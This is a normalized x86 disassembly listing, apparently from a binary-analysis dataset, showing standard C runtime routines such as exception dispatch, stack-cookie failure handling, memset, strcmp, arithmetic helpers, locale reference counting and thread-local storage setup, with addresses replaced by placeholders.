jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1001a94a
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001875a
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001a32e
add esp 0x10
push [ esi + 0x1c ]
call sub_1001a554
sub_1001ae51
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1001c0b4
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1001aabf
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001a32e
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001afb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_100176e6
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10017e85
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100229ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10021dec
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1001a10a
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b0c5
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001afb0
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1001b100
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1001b170
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1001b1a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_100176e6
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_10021dec
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_10022a20
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_10017e85
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_1001b2de
call sub_10022b1c
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10022b29
pop ecx
push 0x3
call sub_1001d77d
int3
push 0x1
push 0x40000015
push 0x3
call sub_1001b769
add esp 0xc
sub_1001b311
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1001b332
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10022ccc
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10022ccc
pop ecx
sub_1001b438
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_1001b5aa
push 0xc
push r--data
call sub_1001de70
push 0xe
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001b611
call sub_1001deb5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1001750d
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1001750d
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1001b620
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1001b6b7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001b6e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10022e32
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1001b769
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1001b6e0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10022ccc
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_10022ccc
pop ecx
sub_1001b892
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1001b769
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1001b8b7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b892
int3
pop ebp
jmp eax
sub_1001b926
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10023a80
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10017e85
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100238cb
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10023758
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_10023875
pop ecx
test eax eax
jne r-xdata
call sub_100238cb
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10023758
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1002382c
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10022f71
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1001ba8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1001b926
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1001bb54
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
pop ebp
retn
call sub_10017e85
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1001b8e4
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10023cc3
call sub_1001ba8a
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_10017e85
mov [ eax ] 0x22
sub_1001bbcb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1001bc5a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1001bcf3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001750d
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001750d
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001750d
push [ esi + 0xc0 ]
call sub_1001750d
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1001f12f
push [ esi + 0xd4 ]
call sub_1001750d
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1001750d
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001750d
pop ecx
push [ esi + 0xb0 ]
call sub_1001750d
push [ esi + 0xbc ]
call sub_1001750d
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001750d
push [ esi + 0xbc ]
call sub_1001f77c
pop ecx
pop ecx
push eax
call sub_1001750d
pop ecx
push eax
call sub_1001750d
push [ esi + 0xbc ]
call sub_1001f523
pop ecx
pop ecx
sub_1001be3e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1001bbcb
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1001bc5a
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1001bcf3
pop ecx
sub_1001be8b
push 0xc
push r--data
call sub_1001de70
call sub_1001c0b4
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1001be3e
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001bef8
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1001c0b4
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1001deb5
retn
push 0x20
call sub_1001d7a2
sub_1001bf16
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1001bf4a
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1001750d
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001bf87
push 0x8
push r--data
call sub_1001de70
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c029
push 0xc
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1001bbcb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c032
call sub_1001deb5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1001c03b
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1001bf16
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10019e40
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_1001750d
pop ecx
xor esi esi
push 0x0
push esi
call sub_1001bf87
